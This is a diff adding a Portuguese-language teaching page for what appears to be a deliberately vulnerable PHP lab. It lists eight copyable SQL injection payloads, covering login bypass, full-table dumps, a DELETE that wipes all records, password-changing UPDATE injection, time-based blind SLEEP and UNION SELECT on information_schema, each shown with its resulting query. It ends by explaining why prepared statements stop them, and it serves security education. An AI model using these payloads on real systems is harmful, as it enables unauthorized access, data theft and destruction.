@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Guia de Ataques — SQL Injection</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: #0f172a; color: #e2e8f0; font-family: Arial, sans-serif; padding-bottom: 60px; }
+    header { background: #1e293b; border-bottom: 2px solid #334155; padding: 16px 24px; display: flex; align-items: center; gap: 12px; }
+    header h1 { font-size: 1.2rem; color: #38bdf8; }
+    header .badge { background: #ef4444; color: #fff; font-size: 0.7rem; padding: 2px 8px; border-radius: 999px; font-weight: bold; }
+    .back { display: inline-block; margin: 20px 24px 0; color: #38bdf8; text-decoration: none; font-size: 0.85rem; }
+    .back:hover { text-decoration: underline; }
+    h2.section { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 0.1em; color: #64748b; padding: 32px 24px 10px; }
+    .attacks { display: flex; flex-direction: column; gap: 16px; padding: 0 24px; max-width: 900px; margin: 0 auto; }
+    .attack { background: #1e293b; border: 1px solid #334155; border-left: 4px solid #ef4444; border-radius: 8px; padding: 20px; }
+    .attack-title { font-size: 1rem; font-weight: bold; color: #f8fafc; margin-bottom: 6px; }
+    .attack-target { font-size: 0.75rem; color: #94a3b8; margin-bottom: 14px; }
+    .attack-target span { background: #0f172a; border: 1px solid #475569; padding: 2px 8px; border-radius: 4px; margin-right: 4px; }
+    .lbl { font-size: 0.72rem; color: #64748b; margin-bottom: 4px; margin-top: 12px; }
+    .payload { background: #020617; border: 1px solid #475569; border-radius: 6px; padding: 10px 14px; font-family: monospace; font-size: 0.9rem; color: #fbbf24; word-break: break-all; cursor: pointer; position: relative; user-select: all; transition: border-color 0.2s; }
+    .payload:hover::after { content: "📋 clique para copiar"; position: absolute; right: 10px; top: 50%; transform: translateY(-50%); font-size: 0.7rem; color: #64748b; font-family: Arial; }
+    .sql-result { background: #020617; border: 1px solid #334155; border-radius: 6px; padding: 10px 14px; font-family: monospace; font-size: 0.82rem; color: #86efac; word-break: break-all; }
+    .explain { font-size: 0.85rem; color: #94a3b8; line-height: 1.6; margin-top: 10px; }
+    .explain strong { color: #fbbf24; }
+    .warn { background: #422006; border: 1px solid #f97316; border-radius: 6px; padding: 10px 14px; font-size: 0.82rem; color: #fdba74; margin-top: 10px; }
+    .pdo-note { background: #14532d; border: 1px solid #22c55e; border-radius: 6px; padding: 10px 14px; font-size: 0.82rem; color: #86efac; margin-top: 10px; }
+    hr.div { border: none; border-top: 1px solid #1e293b; margin: 32px 24px; }
+    .conclusion { background: #1e3a5f; border: 1px solid #3b82f6; border-radius: 10px; padding: 24px; max-width: 900px; margin: 24px auto 0; }
+    .conclusion h3 { color: #93c5fd; margin-bottom: 10px; }
+    .conclusion p { color: #cbd5e1; font-size: 0.9rem; line-height: 1.7; }
+    .conclusion .quote { font-style: italic; color: #fbbf24; font-size: 1rem; text-align: center; margin-top: 16px; }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>📖 Guia de Ataques</h1>
+  <span class="badge">APENAS PARA FINS EDUCACIONAIS</span>
+</header>
+
+<a class="back" href="index.php">← Voltar ao Lab</a>
+
+<div style="max-width:900px;margin:0 auto">
+
+  <h2 class="section">Payloads para testar</h2>
+
+  <div class="attacks">
+
+    <div class="attack">
+      <div class="attack-title">1. OR 1=1 — Bypass de Login</div>
+      <div class="attack-target">Testar em: <span>login_vulneravel.php</span> Campo: <span>Email</span></div>
+      <div class="lbl">Payload</div>
+      <div class="payload" onclick="copyText(this)">' OR 1=1 --</div>
+      <div class="lbl">Query gerada</div>
+      <div class="sql-result">SELECT * FROM usuarios WHERE email = '' OR 1=1 -- ' AND senha = ''</div>
+      <p class="explain">O <strong>'</strong> fecha a string. O <strong>OR 1=1</strong> é sempre verdadeiro. O <strong>--</strong> comenta o restante, incluindo a verificação da senha. Qualquer conta é acessada sem saber a senha.</p>
+      <div class="pdo-note">🔒 No login seguro (processa_login_seguro.php): o payload vira texto puro. A query nunca é alterada.</div>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">2. admin' -- — Ignorar Senha</div>
+      <div class="attack-target">Testar em: <span>login_vulneravel.php</span> Campo: <span>Email</span></div>
+      <div class="lbl">Payload</div>
+      <div class="payload" onclick="copyText(this)">admin@gmail.com' --</div>
+      <div class="lbl">Query gerada</div>
+      <div class="sql-result">SELECT * FROM usuarios WHERE email = 'admin@gmail.com' -- ' AND senha = ''</div>
+      <p class="explain">Aponta para um usuário específico e <strong>comenta a verificação de senha</strong>. Não precisa saber a senha do admin.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">3. OR 'a'='a' — Comparação Sempre Verdadeira</div>
+      <div class="attack-target">Testar em: <span>login_vulneravel.php</span> Campo: <span>Email</span></div>
+      <div class="lbl">Payload</div>
+      <div class="payload" onclick="copyText(this)">' OR 'a'='a</div>
+      <div class="lbl">Query gerada</div>
+      <div class="sql-result">SELECT * FROM usuarios WHERE email = '' OR 'a'='a' AND senha = ''</div>
+      <p class="explain">Variação do OR 1=1. Útil quando filtros numéricos estão bloqueados mas comparações de string passam.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">4. OR 1=1 na Busca — Exfiltrar Todos os Dados</div>
+      <div class="attack-target">Testar em: <span>busca_vulneravel.php</span> → resultado em: <span>resultado_busca.php</span></div>
+      <div class="lbl">Payload</div>
+      <div class="payload" onclick="copyText(this)">' OR 1=1 --</div>
+      <div class="lbl">Query gerada</div>
+      <div class="sql-result">SELECT * FROM usuarios WHERE email LIKE '%' OR 1=1 -- %'</div>
+      <p class="explain">Retorna <strong>todos os registros da tabela</strong>. Em sistemas reais, exporia dados de todos os usuários cadastrados.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">5. OR 1=1 no DELETE — Apagar Tudo</div>
+      <div class="attack-target">Testar em: <span>delete_vulneravel.php</span> → processado em: <span>processa_delete.php</span></div>
+      <div class="lbl">Payload</div>
+      <div class="payload" onclick="copyText(this)">1 OR 1=1</div>
+      <div class="lbl">Query gerada</div>
+      <div class="sql-result">DELETE FROM usuarios WHERE id = 1 OR 1=1</div>
+      <div class="warn">⚠️ ATENÇÃO: esse ataque apaga TODOS os registros. Execute o setup.sql para restaurar os dados.</div>
+      <p class="explain">Um campo de ID sem proteção pode destruir toda a base de dados com uma única requisição.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">6. Injeção no UPDATE — Alterar Campos Extras</div>
+      <div class="attack-target">Testar em: <span>update_vulneravel.php</span> → processado em: <span>processa_update.php</span></div>
+      <div class="lbl">Payload (campo email)</div>
+      <div class="payload" onclick="copyText(this)">hacker@email.com', senha='123456</div>
+      <div class="lbl">Query gerada</div>
+      <div class="sql-result">UPDATE usuarios SET email = 'hacker@email.com', senha='123456' WHERE id = 1</div>
+      <p class="explain">O atacante fecha a string e <strong>injeta um campo extra no SET</strong>, alterando a senha — um campo que o formulário nem exibe.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">7. SLEEP — Blind SQL Injection (por tempo)</div>
+      <div class="attack-target">Testar em: <span>login_vulneravel.php</span> Campo: <span>Email</span></div>
+      <div class="lbl">Payload</div>
+      <div class="payload" onclick="copyText(this)">' OR SLEEP(3) --</div>
+      <div class="lbl">Query gerada</div>
+      <div class="sql-result">SELECT * FROM usuarios WHERE email = '' OR SLEEP(3) -- ' AND senha = ''</div>
+      <p class="explain">Se a página demorar ~3 segundos, <strong>o SQL foi executado</strong>. Prova a vulnerabilidade mesmo quando o sistema não exibe erros — técnica usada em Blind SQLi.</p>
+    </div>
+
+    <div class="attack">
+      <div class="attack-title">8. UNION SELECT — Puxar Dados de Outras Tabelas</div>
+      <div class="attack-target">Testar em: <span>busca_vulneravel.php</span> → resultado em: <span>resultado_busca.php</span></div>
+      <div class="lbl">Payload</div>
+      <div class="payload" onclick="copyText(this)">' UNION SELECT 1, table_name, 3 FROM information_schema.tables --</div>
+      <p class="explain">Quando o número de colunas coincide, o UNION combina resultados de <strong>qualquer tabela do banco</strong>. Em produção, pode expor tabelas de cartões, tokens, senhas e mais.</p>
+    </div>
+
+  </div>
+
+  <hr class="div">
+
+  <div class="attacks">
+    <div class="conclusion">
+      <h3>🔑 Por que o PDO resolve tudo isso?</h3>
+      <p>
+        Com <strong>Prepared Statements</strong>, a query e os dados chegam ao banco <em>separados</em>.
+        Não importa o que o usuário digitar — o banco nunca interpreta os dados como código SQL.
+        O <strong>' OR 1=1 --</strong> vira literalmente a string <code>' OR 1=1 --</code>,
+        e a query falha normalmente como se fosse um email inválido qualquer.
+      </p>
+      <div class="quote">"SQL Injection não é hack avançado. É erro básico de programação."</div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  function copyText(el) {
+    navigator.clipboard.writeText(el.innerText).then(() => {
+      el.style.borderColor = '#22c55e';
+      setTimeout(() => el.style.borderColor = '#475569', 800);
+    });
+  }
+</script>
+
+</body>
+</html>
